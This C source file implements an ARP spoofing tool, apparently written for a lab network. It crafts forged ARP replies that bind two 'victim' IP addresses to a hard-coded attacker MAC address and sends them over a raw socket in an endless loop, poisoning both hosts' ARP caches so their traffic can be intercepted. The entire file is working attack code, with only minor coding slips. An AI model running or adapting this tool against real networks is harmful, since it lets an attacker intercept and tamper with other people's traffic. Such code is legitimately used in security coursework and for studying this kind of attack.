#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <netinet/ip.h>
#include <net/ethernet.h>

#include "packets.h"

# define BROADCAST_ADDR (uint8_t[6]){0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
# define ERROR_PACKET_CREATION_ARP      fprintf(stderr,"ERROR: ARP packet creation failed\n")
# define ERROR_PACKET_CREATION_ETHER    fprintf(stderr,"ERROR: Ether frame creation failed\n")
# define ERROR_COULD_NOT_SEND           fprintf(stderr,"ERROR: Could not send\n")
# define ERROR_COULD_NOT_RECEIVE        fprintf(stderr,"ERROR: Could not receive\n")

#define CHARTOMAC(cmac,mac) \
    sscanf((cmac),"%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",\
           &(mac)[0],&(mac)[1],&(mac)[2],&(mac)[3],&(mac)[4],&(mac)[5])

void printMac(unsigned char *macAddr){
    fprintf(stdout, "%02X:%02X:%02X:%02X:%02X:%02X\n", macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4],macAddr[5]);
    return;
}
void printIp(char * ipAddr){
    printf("%s",ipAddr);
    return;
}

char broadcast_packet(const int sck,
                      struct sockaddr_ll *device,
                      const uint8_t *hacker_mac,
                      const char *spoof_ip,
                      const char *victim_ip)
{
    eth_header* eth_pkt;

    /* NOTE: See <net/if_ether.h> for packet opcode */
    eth_pkt = createArpPacket(ARPOP_REQUEST,
                                    hacker_mac, spoof_ip,
                                    BROADCAST_ADDR, victim_ip);
    if (!(eth_pkt)) {
        ERROR_PACKET_CREATION_ETHER;
        return 0;
    }
    fprintf(stdout, "packet created for broadcast\n");

    if ((sendto(sck, eth_pkt, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                (const struct sockaddr *)device, sizeof(*device))) <= 0) {
        ERROR_COULD_NOT_SEND;
        return 0;
    }
    fprintf(stdout, "Packet broadcasted\n");

    return 1;
}


void spoofArp(const int skt, struct sockaddr_ll *device,
               const uint8_t *hacker_mac,
               const char *victim_ip_1, const uint8_t *victim_mac_1,
               const char *victim_ip_2, const uint8_t *victim_mac_2)
{
    eth_header *arp_packet1;
    eth_header *arp_packet2;
    arp_packet1 = createArpPacket(ARPOP_REPLY,
                                           hacker_mac, victim_ip_1,
                                           victim_mac_2, victim_ip_2);
    arp_packet2 = createArpPacket(ARPOP_REPLY,
                                           hacker_mac, victim_ip_2,
                                           victim_mac_1, victim_ip_1);
    if (!(arp_packet1) ||!(arp_packet2) ) {
        ERROR_PACKET_CREATION_ARP;
        return 0;
    }


    while (1) {
        if ((sendto(skt, arp_packet2, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            ERROR_COULD_NOT_SEND;
            return 0;
        }
        fprintf(stdout, "Spoofed Packet sent to '%s'\n", victim_ip_1);
        if ((sendto(skt, arp_packet1, ARP_PKT_LEN + ETH_HDR_LEN, 0,
                    (const struct sockaddr *)device, sizeof(*device))) <= 0) {
            ERROR_COULD_NOT_SEND;
            return 0;
        }
        fprintf(stdout, "Spoofed Packet sent to '%s'\n", victim_ip_2);
        sleep(5);
        
    }

    return 1;
}

int main(int argc, char *argv[])
{
    char *victim_ip_1, *victim_ip_2, *interface, *hacker_ip;
    interface = "eth0";
    
    hacker_ip = "10.9.0.105";
    unsigned char *hacker_mac = NULL;
    hacker_mac = malloc(sizeof(uint8_t) * MACADDR_LEN);
    hacker_mac[0] = 0X02;
    hacker_mac[1] = 0X42;
    hacker_mac[2] = 0X0A;
    hacker_mac[3] = 0X09;
    hacker_mac[4] = 0X69;
    hacker_mac[5] = 0X00;

    printf("Attacker IP address: ");
    printIp(hacker_ip);
    printf(" || Attacker MAC address: ");
    printMac(hacker_mac);
    
    victim_ip_1 = "10.9.0.5";
    victim_ip_2 = "10.9.0.6";
    unsigned char *victim_mac_1 = NULL;
    unsigned char *victim_mac_2 = NULL;
    victim_mac_1 = malloc(sizeof(uint8_t) * MACADDR_LEN);
    victim_mac_1[0] = 0X02;
    victim_mac_1[1] = 0X42;
    victim_mac_1[2] = 0X0A;
    victim_mac_1[3] = 0X09;
    victim_mac_1[4] = 0X00;
    victim_mac_1[5] = 0X05;

    victim_mac_2 = malloc(sizeof(uint8_t) * MACADDR_LEN);
    victim_mac_2[0] = 0X02;
    victim_mac_2[1] = 0X42;
    victim_mac_2[2] = 0X0A;
    victim_mac_2[3] = 0X09;
    victim_mac_2[4] = 0X00;
    victim_mac_2[5] = 0X06;
    printf("Victim 1's IP address: ");
    printIp(victim_ip_1);
    fprintf(stdout, " || Victim 1's MAC address : ");
    printMac(victim_mac_1);
    printf("Victim 2's IP address: ");
    printIp(victim_ip_2);
    fprintf(stdout, " || Victim 1's MAC address : ");
    printMac(victim_mac_2);
    fprintf(stdout, "\n");
    
    int sock;
    struct sockaddr_ll device;

    /** NOTE:
     *
     * extern int socket (int __domain, int __type, int __protocol) __THROW;
     *
     * AF_PACKET and PF_PACKET are of address and protocol family.
     * `man 2 socket` uses AF_PACKET, but the tutorial at the link below
     * uses PF_PACKET. However, BSD manual says their values are the same.
     *
     * Tutorial link: https://www.programmersought.com/article/40053885963/
     *
     * htons() handles byte order of little endian machines. In big endian
     * machines it returns the value it is given. See `man htons`.
     *
     * See `man 7 packet`
     *
     */
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock == -1) {
        fprintf(stderr,"Socket creation failed\n");
        return EXIT_FAILURE;
    }
    memset(&device, 0, sizeof device);
    
    if (device.sll_ifindex = if_nametoindex(interface)) {
        fprintf(stdout, "Got index '%d' from interface '%s'\n",device.sll_ifindex, interface);
    }
    
    fprintf(stdout, "Spoofing starts:\n");
    spoofArp(sock, &device, hacker_mac,
              victim_ip_1, victim_mac_1,
              victim_ip_2, victim_mac_2);

    if (hacker_mac != NULL) free(hacker_mac);
    close(sock);

    return 0;
}
